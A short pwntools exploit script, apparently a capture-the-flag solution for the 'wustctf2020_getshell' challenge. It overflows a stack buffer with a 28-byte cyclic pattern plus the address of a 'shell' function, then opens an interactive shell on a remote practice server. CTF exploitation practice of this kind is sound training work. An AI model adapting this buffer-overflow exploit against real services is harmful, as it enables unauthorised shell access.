from pwn import *

context.log_level = "debug"

exe = ELF("./wustctf2020_getshell")
# r = exe.process()
r = remote("node4.buuoj.cn", 29324)

r.send(cyclic(28) + p32(exe.sym["shell"]))
r.interactive()
